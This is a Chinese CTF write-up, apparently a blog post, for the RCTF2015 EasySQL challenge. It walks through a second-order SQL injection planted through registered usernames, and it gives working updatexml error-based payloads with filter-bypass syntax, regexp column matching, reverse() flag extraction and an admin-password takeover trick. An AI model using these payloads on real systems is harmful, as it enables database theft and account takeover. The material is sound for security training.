# [RCTF2015]EasySQL 二次注入 regexp指定字段 reverse逆序输出

第一眼没看出来 我以为是伪造管理员

就先去测试管理员账号

去register.php

注册 首先先注册一个自己的账号

我喜欢用admin123



<img src="https://i-blog.csdnimg.cn/blog_migrate/5d5c4efa53e9d79db3e6fe81927a02d6.png" alt="" style="max-height:186px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/4f6e7ec68c74d7fe9757b8d25b401240.png" alt="" style="max-height:222px; box-sizing:content-box;" />


发现里面存在修改密码的内容 那么肯定链接到数据库了

题目又提示是sql

那我们看看能不能修改管理员密码

首先我们猜测闭合

通过用户名

```undefined
admin"
```

然后点击修改密码 进行修改密码

发现报错了



<img src="https://i-blog.csdnimg.cn/blog_migrate/7c6a594e88cb7f5bcb4d09e04920d207.png" alt="" style="max-height:222px; box-sizing:content-box;" />


这里我们就可以先进行判断sql语句了

```cobol
select  * from users where username="admin"" and pwd='21232f297a57a5a743894a0e4a801fc3
```

那我们这里就很简单了 因为修改成功没有回显报错有回显

我们直接报错注入即可

```scss
admin"or(updatexml(1,0x7e,4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/80ba1a3ba8d0907bc6914c793bf9960d.png" alt="" style="max-height:327px; box-sizing:content-box;" />


发现报错了 肯定存在过滤

那我们fuzz一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/d246e44f6a23e3277c49117b64c1668f.png" alt="" style="max-height:317px; box-sizing:content-box;" />


and 和 空格被过滤

绕过即可

```scss
admin"or(updatexml(1,0x7e,4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ee8673d5c11c748e96505230e867981c.png" alt="" style="max-height:88px; box-sizing:content-box;" />


报错成功

我们开始注入

```scss
admin"or(updatexml(1,concat(0x7e,database()),3))#
 
数据库为 web_sqli
 
 
admin"or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema="web_sqli"))),4))#
 
爆出表名为 article,flag,users
 
 
admin"or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name="users"))),4))#
 
 
```

这里就有一个坑



<img src="https://i-blog.csdnimg.cn/blog_migrate/d6b6aeacb8daef996da537ff2b4963ac.png" alt="" style="max-height:108px; box-sizing:content-box;" />


报错出来是错的。。。。  应该是here

晕咯 学习一下函数

## regexp

```scss
regexp('^r')
```

这个函数可以通过正则来匹配字段 这里就是 r开头的字段

```scss
admin"or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name="users")&&(column_name)regexp('^r'))),4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/855488f04acc26ed4b7a3821e721a07f.png" alt="" style="max-height:104px; box-sizing:content-box;" />


接着写

```scss
admin"or(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc23ed7df77566f2b6ebeda7ee2bc6d3.png" alt="" style="max-height:154px; box-sizing:content-box;" />


flag开头 那我们直接查f开头即可

```scss
admin"or(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9aceb441d0b2dff667ecc98fd6659301.png" alt="" style="max-height:177px; box-sizing:content-box;" />


还有一半无法读取 并且无法使用

看了wp 使用逆序输出 然后使用脚本恢复即可

## reverse

```scss
admin"or(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),4))#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0623ecbee3eabf2130b876c48c6a2498.png" alt="" style="max-height:176px; box-sizing:content-box;" />


```cobol
flag='}0e330032cd22-f828-d154-53d8-6e'
flag=flag[::-1]
print(flag)
```



拼接即可得出flag

## 其他

提一嘴 我们只要知道了闭合就可以修改管理员密码了

```undefined
admin"#
```

然后修改 密码 就可以登入 admin账号了 但是这道题没有用就是了